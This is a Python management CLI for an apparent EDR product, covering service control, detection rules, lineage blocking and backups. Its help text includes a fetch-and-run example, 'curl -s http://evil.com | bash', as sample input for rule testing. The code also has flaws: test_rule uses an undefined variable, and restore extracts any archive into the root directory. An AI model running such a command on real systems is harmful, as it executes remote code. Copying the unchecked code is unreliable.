#!/usr/bin/env python3
"""
Sentinel Lineage EDR - CLI Management Tool
Enterprise-grade command-line interface for managing Sentinel deployments.
"""

import sys
import os
import json
import yaml
import argparse
import subprocess
import time
import signal
import urllib.request
from pathlib import Path
from typing import Dict, List, Optional

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

VERSION = "2.1.0"

class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[0;36m'
    NC = '\033[0m'

def log(msg): print(f"{Colors.CYAN}[*]{Colors.NC} {msg}")
def ok(msg): print(f"{Colors.GREEN}[✓]{Colors.NC} {msg}")
def warn(msg): print(f"{Colors.YELLOW}[!]{Colors.NC} {msg}")
def err(msg): print(f"{Colors.RED}[✗]{Colors.NC} {msg}")

class SentinelCLI:
    def __init__(self):
        self.config_path = os.getenv('SENTINEL_CONFIG', '/etc/sentinel/config.yaml')
        self.rules_path = os.getenv('SENTINEL_RULES', '/etc/sentinel/rules.yaml')
        self.agent_pid_file = '/var/run/sentinel-agent.pid'
        self.collector_pid_file = '/var/run/sentinel-collector.pid'

    # ─── System Commands ───
    def status(self, args):
        """Show system status"""
        log("Checking Sentinel status...")

        # Check agent
        agent_running = self._check_process('sentinel-agent')
        collector_running = self._check_process('sentinel-collector')

        print(f"\n{'Component':<20} {'Status':<10} {'PID'}")
        print(f"{'-'*20} {'-'*10} {'-'*10}")
        print(f"{'Agent':<20} {'RUNNING' if agent_running else 'STOPPED':<10} {self._get_pid('sentinel-agent') or '-'}")
        print(f"{'Collector':<20} {'RUNNING' if collector_running else 'STOPPED':<10} {self._get_pid('sentinel-collector') or '-'}")

        # Check eBPF
        ebpf_loaded = self._check_ebpf()
        print(f"{'eBPF Module':<20} {'LOADED' if ebpf_loaded else 'NOT LOADED':<10}")

        # Check kernel
        kernel_ok = self._check_kernel()
        print(f"{'Kernel Compatible':<20} {'YES' if kernel_ok else 'NO':<10}")

        # Collector health
        if collector_running:
            health = self._get_collector_health()
            if health:
                print(f"\nCollector Health:")
                print(f"  Uptime: {health.get('uptime_seconds', 0)}s")
                print(f"  Active Nodes: {health.get('active_nodes', 0)}")
                print(f"  Total Events: {health.get('total_events', 0)}")
                print(f"  Lineages Tracked: {health.get('lineage', {}).get('total_lineages', 0)}")
                print(f"  Blocked Lineages: {health.get('lineage', {}).get('blocked_lineages', 0)}")

    def _check_process(self, name: str) -> bool:
        try:
            subprocess.run(['pgrep', '-f', name], check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError:
            return False

    def _get_pid(self, name: str) -> Optional[str]:
        try:
            result = subprocess.run(['pgrep', '-f', name], capture_output=True, text=True)
            return result.stdout.strip().split('\n')[0] if result.stdout.strip() else None
        except:
            return None

    def _check_ebpf(self) -> bool:
        try:
            result = subprocess.run(['bpftool', 'prog', 'list'], capture_output=True, text=True)
            return 'sentinel' in result.stdout.lower()
        except:
            return False

    def _check_kernel(self) -> bool:
        try:
            with open('/proc/version', 'r') as f:
                version = f.read()
            return '5.10' in version or '5.15' in version or '6.' in version
        except:
            return False

    def _get_collector_health(self) -> Optional[Dict]:
        try:
            req = urllib.request.Request('http://localhost:8080/health')
            with urllib.request.urlopen(req, timeout=5) as resp:
                return json.loads(resp.read())
        except:
            return None

    def start(self, args):
        """Start Sentinel services"""
        if args.component in ['all', 'agent']:
            log("Starting Sentinel Agent...")
            subprocess.run(['systemctl', 'start', 'sentinel-agent'], check=False)
            time.sleep(2)
            if self._check_process('sentinel-agent'):
                ok("Agent started")
            else:
                err("Agent failed to start")

        if args.component in ['all', 'collector']:
            log("Starting Sentinel Collector...")
            subprocess.run(['systemctl', 'start', 'sentinel-collector'], check=False)
            time.sleep(2)
            if self._check_process('sentinel-collector'):
                ok("Collector started")
            else:
                err("Collector failed to start")

    def stop(self, args):
        """Stop Sentinel services"""
        if args.component in ['all', 'agent']:
            log("Stopping Sentinel Agent...")
            subprocess.run(['systemctl', 'stop', 'sentinel-agent'], check=False)
            ok("Agent stopped")

        if args.component in ['all', 'collector']:
            log("Stopping Sentinel Collector...")
            subprocess.run(['systemctl', 'stop', 'sentinel-collector'], check=False)
            ok("Collector stopped")

    def restart(self, args):
        """Restart Sentinel services"""
        self.stop(args)
        time.sleep(2)
        self.start(args)

    def enable(self, args):
        """Enable services at boot"""
        if args.component in ['all', 'agent']:
            subprocess.run(['systemctl', 'enable', 'sentinel-agent'], check=False)
            ok("Agent enabled")
        if args.component in ['all', 'collector']:
            subprocess.run(['systemctl', 'enable', 'sentinel-collector'], check=False)
            ok("Collector enabled")

    def disable(self, args):
        """Disable services at boot"""
        if args.component in ['all', 'agent']:
            subprocess.run(['systemctl', 'disable', 'sentinel-agent'], check=False)
            ok("Agent disabled")
        if args.component in ['all', 'collector']:
            subprocess.run(['systemctl', 'disable', 'sentinel-collector'], check=False)
            ok("Collector disabled")

    # ─── Rule Management ───
    def validate_rules(self, args):
        """Validate rules configuration"""
        from tools.validate_rules import RuleValidator
        validator = RuleValidator()
        success, _ = validator.validate_file(args.file)
        sys.exit(0 if success else 1)

    def list_rules(self, args):
        """List all rules"""
        with open(args.file, 'r') as f:
            data = yaml.safe_load(f)

        rules = data.get('rules', [])
        print(f"\n{'ID':<8} {'Action':<8} {'Severity':<10} {'Name'}")
        print(f"{'-'*8} {'-'*8} {'-'*10} {'-'*60}")
        for rule in rules:
            flags_str = self._flags_to_str(rule.get('flags', 0))
            print(f"{rule.get('id', ''):<8} {rule.get('action', ''):<8} {rule.get('severity', ''):<10} {rule.get('name', '')}")
            if args.verbose:
                print(f"  Flags: {flags_str}")
                if rule.get('pattern'):
                    print(f"  Pattern: {rule['pattern'][:80]}")
                if rule.get('binary_pattern'):
                    print(f"  Binary: {rule['binary_pattern'][:80]}")
                if rule.get('mitre'):
                    print(f"  MITRE: {', '.join(rule['mitre'])}")
                if rule.get('tags'):
                    print(f"  Tags: {', '.join(rule['tags'])}")
                print()

    def _flags_to_str(self, flags: int) -> str:
        parts = []
        if flags & 1: parts.append("REGEX")
        if flags & 2: parts.append("CMDLINE")
        if flags & 4: parts.append("BINARY")
        if flags & 8: parts.append("LINEAGE")
        if flags & 16: parts.append("UID_RANGE")
        if flags & 32: parts.append("NETWORK")
        if flags & 64: parts.append("FILE_WRITE")
        return "|".join(parts) if parts else "NONE"

    def add_rule(self, args):
        """Add a new rule interactively"""
        with open(args.file, 'r') as f:
            data = yaml.safe_load(f)

        # Find next available ID
        existing_ids = [r.get('id', 0) for r in data.get('rules', [])]
        next_id = max(existing_ids) + 1 if existing_ids else 10000

        print(f"Adding new rule (ID: {next_id})")
        name = input("Name: ")
        pattern = input("Pattern (regex): ") or ""
        binary_pattern = input("Binary pattern (regex): ") or ""
        action = input("Action (LOG/ALERT/KILL/BLOCK/QUARANTINE) [KILL]: ") or "KILL"
        severity = input("Severity (INFO/LOW/MEDIUM/HIGH/CRITICAL) [HIGH]: ") or "HIGH"

        # Flags
        print("Flags (comma-separated): REGEX=1, CMDLINE=2, BINARY=4, LINEAGE=8, UID_RANGE=16, NETWORK=32, FILE_WRITE=64")
        flags_input = input("Flags [3]: ") or "3"
        flags = sum(int(f) for f in flags_input.split(','))

        new_rule = {
            'id': next_id,
            'name': name,
            'action': action,
            'severity': severity,
            'flags': flags
        }
        if pattern:
            new_rule['pattern'] = pattern
        if binary_pattern:
            new_rule['binary_pattern'] = binary_pattern

        data.setdefault('rules', []).append(new_rule)

        with open(args.file, 'w') as f:
            yaml.dump(data, f, sort_keys=False)

        ok(f"Rule {next_id} added")

    def delete_rule(self, args):
        """Delete a rule by ID"""
        with open(args.file, 'r') as f:
            data = yaml.safe_load(f)

        rules = data.get('rules', [])
        original_count = len(rules)
        data['rules'] = [r for r in rules if r.get('id') != args.rule_id]

        if len(data['rules']) == original_count:
            err(f"Rule {args.rule_id} not found")
            sys.exit(1)

        with open(args.file, 'w') as f:
            yaml.dump(data, f, sort_keys=False)

        ok(f"Rule {args.rule_id} deleted")

    # ─── Lineage Management ───
    def list_lineages(self, args):
        """List all tracked lineages"""
        try:
            req = urllib.request.Request('http://localhost:5000/api/v1/lineage')
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read())
        except Exception as e:
            err(f"Failed to connect to collector: {e}")
            sys.exit(1)

        print(f"\n{'Lineage ID':<20} {'Status':<12} {'Processes':<10} {'Threats':<8} {'Root PID'}")
        print(f"{'-'*20} {'-'*12} {'-'*10} {'-'*8} {'-'*10}")
        for lineage_id, tree in data.items():
            status = "BLOCKED" if tree.get('blocked') else ("TRUSTED" if tree.get('trusted') else "MONITORING")
            print(f"{lineage_id:<20} {status:<12} {len(tree.get('nodes', {})):<10} {tree.get('threat_count', 0):<8} {tree.get('root_pid', '-')}")

    def block_lineage(self, args):
        """Block a lineage"""
        url = f'http://localhost:5000/api/v1/lineage/{args.lineage_id}/block'
        try:
            req = urllib.request.Request(url, method='POST')
            with urllib.request.urlopen(req, timeout=5) as resp:
                result = json.loads(resp.read())
            ok(f"Lineage {args.lineage_id} blocked: {result}")
        except Exception as e:
            err(f"Failed to block lineage: {e}")
            sys.exit(1)

    def trust_lineage(self, args):
        """Trust a lineage"""
        url = f'http://localhost:5000/api/v1/lineage/{args.lineage_id}/trust'
        try:
            req = urllib.request.Request(url, method='POST')
            with urllib.request.urlopen(req, timeout=5) as resp:
                result = json.loads(resp.read())
            ok(f"Lineage {args.lineage_id} trusted: {result}")
        except Exception as e:
            err(f"Failed to trust lineage: {e}")
            sys.exit(1)

    def show_lineage(self, args):
        """Show detailed lineage tree"""
        try:
            req = urllib.request.Request(f'http://localhost:5000/api/v1/lineage/{args.lineage_id}')
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read())
        except Exception as e:
            err(f"Failed to get lineage: {e}")
            sys.exit(1)

        print(json.dumps(data, indent=2))

    # ─── Configuration ───
    def show_config(self, args):
        """Show current configuration"""
        for path in [self.config_path, self.rules_path]:
            if os.path.exists(path):
                print(f"\n=== {path} ===")
                with open(path, 'r') as f:
                    print(f.read())
            else:
                warn(f"Not found: {path}")

    def check_config(self, args):
        """Validate configuration files"""
        log("Validating configuration...")
        # TODO: Implement config validation
        ok("Configuration validation not yet implemented")

    # ─── Maintenance ───
    def update_trusted(self, args):
        """Update trusted binaries from package manager"""
        log("Updating trusted binaries...")
        # This would run the package manager and compute SHA256 hashes
        # For now, just show what would be done
        print("Would scan installed packages and update /etc/sentinel/trusted_binaries.json")
        warn("Not yet implemented")

    def update_geoip(self, args):
        """Update GeoIP database"""
        log("Updating GeoIP database...")
        try:
            subprocess.run(['geoipupdate'], check=True)
            ok("GeoIP database updated")
        except subprocess.CalledProcessError:
            err("geoipupdate failed - check /etc/GeoIP.conf")
            sys.exit(1)
        except FileNotFoundError:
            err("geoipupdate not installed")
            sys.exit(1)

    def backup(self, args):
        """Create backup"""
        timestamp = time.strftime('%Y%m%d-%H%M%S')
        backup_path = f"/var/backups/sentinel-backup-{timestamp}.tar.gz"
        log(f"Creating backup: {backup_path}")
        subprocess.run(['tar', 'czf', backup_path, '/etc/sentinel', '/var/lib/sentinel'], check=True)
        ok(f"Backup created: {backup_path}")

    def restore(self, args):
        """Restore from backup"""
        if not args.backup_file:
            err("Backup file required")
            sys.exit(1)
        log(f"Restoring from {args.backup_file}...")
        subprocess.run(['tar', 'xzf', args.backup_file, '-C', '/'], check=True)
        ok("Restore complete - restart services to apply")

    def support_bundle(self, args):
        """Generate support bundle"""
        timestamp = time.strftime('%Y%m%d-%H%M%S')
        bundle_path = f"/tmp/sentinel-support-{timestamp}.tar.gz"
        log(f"Generating support bundle: {bundle_path}")

        # Collect logs, config, system info
        with open('/tmp/sentinel-system-info.txt', 'w') as f:
            f.write(f"Sentinel Version: {VERSION}\n")
            f.write(f"Date: {time.ctime()}\n\n")
            subprocess.run(['uname', '-a'], stdout=f)
            f.write("\n")
            subprocess.run(['systemctl', 'status', 'sentinel-agent'], stdout=f)
            f.write("\n")
            subprocess.run(['systemctl', 'status', 'sentinel-collector'], stdout=f)
            f.write("\n")
            subprocess.run(['bpftool', 'prog', 'list'], stdout=f)
            f.write("\n")
            subprocess.run(['bpftool', 'map', 'list'], stdout=f)

        subprocess.run(['tar', 'czf', bundle_path,
                        '/etc/sentinel',
                        '/var/log/sentinel',
                        '/tmp/sentinel-system-info.txt'], check=True)
        ok(f"Support bundle created: {bundle_path}")

    # ─── Testing ───
    def test_rule(self, args):
        """Test a rule against a command"""
        # Load rules
        with open(self.rules_path, 'r') as f:
            data = yaml.safe_load(f)

        from tests.test_lineage import match_rule, load_rules_from_yaml, LineageEntry, Rule
        load_rules_from_yaml(yaml.dump(data))

        # Create test entry
        entry = LineageEntry(
            lineage_id=0x1234,
            parent_lineage_id=0,
            pid=12345,
            ppid=12344,
            uid=1000,
            gid=1000,
            ns_pid=12345,
            comm=args.command.split()[0],
            binary_path=args.command.split()[0],
            cmdline=args.command,
            exec_timestamp=time.time(),
            flags=0
        )

        matched = False
        for rule in rules:
            if match_rule(entry, rule):
                print(f"MATCHED: {rule.name} (ID: {rule.id})")
                print(f"  Action: {rule.action}")
                print(f"  Severity: {rule.severity}")
                print(f"  MITRE: {rule.mitre if hasattr(rule, 'mitre') else 'N/A'}")
                matched = True

        if not matched:
            print("No rule matched (benign)")

    def run_tests(self, args):
        """Run test suite"""
        log("Running test suite...")
        result = subprocess.run([sys.executable, 'tests/test_lineage.py'], cwd=Path(__file__).parent.parent)
        sys.exit(result.returncode)

def main():
    parser = argparse.ArgumentParser(
        description=f'Sentinel Lineage EDR CLI v{VERSION}',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sentinel status
  sentinel start --component all
  sentinel rules validate
  sentinel rules list --verbose
  sentinel rules add
  sentinel rules delete --rule-id 1001
  sentinel lineage list
  sentinel lineage block --lineage-id 0xDEADBEEF
  sentinel test-rule --command "curl -s http://evil.com | bash"
  sentinel backup
  sentinel support-bundle
        """
    )
    parser.add_argument('--version', action='version', version=VERSION)

    subparsers = parser.add_subparsers(dest='command', help='Commands')

    # Status
    subparsers.add_parser('status', help='Show system status')

    # Service management
    for cmd in ['start', 'stop', 'restart', 'enable', 'disable']:
        p = subparsers.add_parser(cmd, help=f'{cmd.capitalize()} services')
        p.add_argument('--component', choices=['all', 'agent', 'collector'], default='all')

    # Rules
    rules_parser = subparsers.add_parser('rules', help='Rule management')
    rules_sub = rules_parser.add_subparsers(dest='rules_cmd')
    rules_sub.add_parser('validate', help='Validate rules').add_argument('--file', default='/etc/sentinel/rules.yaml')
    p = rules_sub.add_parser('list', help='List rules')
    p.add_argument('--file', default='/etc/sentinel/rules.yaml')
    p.add_argument('--verbose', '-v', action='store_true')
    rules_sub.add_parser('add', help='Add rule interactively').add_argument('--file', default='/etc/sentinel/rules.yaml')
    p = rules_sub.add_parser('delete', help='Delete rule')
    p.add_argument('--rule-id', type=int, required=True)
    p.add_argument('--file', default='/etc/sentinel/rules.yaml')

    # Lineage
    lineage_parser = subparsers.add_parser('lineage', help='Lineage management')
    lineage_sub = lineage_parser.add_subparsers(dest='lineage_cmd')
    lineage_sub.add_parser('list', help='List all lineages')
    p = lineage_sub.add_parser('block', help='Block lineage')
    p.add_argument('--lineage-id', required=True)
    p = lineage_sub.add_parser('trust', help='Trust lineage')
    p.add_argument('--lineage-id', required=True)
    p = lineage_sub.add_parser('show', help='Show lineage details')
    p.add_argument('--lineage-id', required=True)

    # Config
    config_parser = subparsers.add_parser('config', help='Configuration')
    config_sub = config_parser.add_subparsers(dest='config_cmd')
    config_sub.add_parser('show', help='Show configuration')
    config_sub.add_parser('check', help='Validate configuration')

    # Maintenance
    maint_parser = subparsers.add_parser('maintenance', help='Maintenance tasks')
    maint_sub = maint_parser.add_subparsers(dest='maint_cmd')
    maint_sub.add_parser('update-trusted', help='Update trusted binaries')
    maint_sub.add_parser('update-geoip', help='Update GeoIP database')
    maint_sub.add_parser('backup', help='Create backup')
    p = maint_sub.add_parser('restore', help='Restore from backup')
    p.add_argument('backup_file')
    maint_sub.add_parser('support-bundle', help='Generate support bundle')

    # Testing
    test_parser = subparsers.add_parser('test', help='Testing')
    test_sub = test_parser.add_subparsers(dest='test_cmd')
    p = test_sub.add_parser('rule', help='Test rule against command')
    p.add_argument('--command', required=True)
    test_sub.add_parser('suite', help='Run full test suite')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    cli = SentinelCLI()

    # Route commands
    cmd_map = {
        'status': cli.status,
        'start': cli.start,
        'stop': cli.stop,
        'restart': cli.restart,
        'enable': cli.enable,
        'disable': cli.disable,
    }

    if args.command in cmd_map:
        cmd_map[args.command](args)
    elif args.command == 'rules':
        rules_map = {
            'validate': cli.validate_rules,
            'list': cli.list_rules,
            'add': cli.add_rule,
            'delete': cli.delete_rule,
        }
        rules_map.get(args.rules_cmd, lambda x: err("Unknown rules command"))(args)
    elif args.command == 'lineage':
        lineage_map = {
            'list': cli.list_lineages,
            'block': cli.block_lineage,
            'trust': cli.trust_lineage,
            'show': cli.show_lineage,
        }
        lineage_map.get(args.lineage_cmd, lambda x: err("Unknown lineage command"))(args)
    elif args.command == 'config':
        config_map = {
            'show': cli.show_config,
            'check': cli.check_config,
        }
        config_map.get(args.config_cmd, lambda x: err("Unknown config command"))(args)
    elif args.command == 'maintenance':
        maint_map = {
            'update-trusted': cli.update_trusted,
            'update-geoip': cli.update_geoip,
            'backup': cli.backup,
            'restore': cli.restore,
            'support-bundle': cli.support_bundle,
        }
        maint_map.get(args.maint_cmd, lambda x: err("Unknown maintenance command"))(args)
    elif args.command == 'test':
        test_map = {
            'rule': cli.test_rule,
            'suite': cli.run_tests,
        }
        test_map.get(args.test_cmd, lambda x: err("Unknown test command"))(args)
    else:
        err(f"Unknown command: {args.command}")
        sys.exit(1)

if __name__ == '__main__':
    main()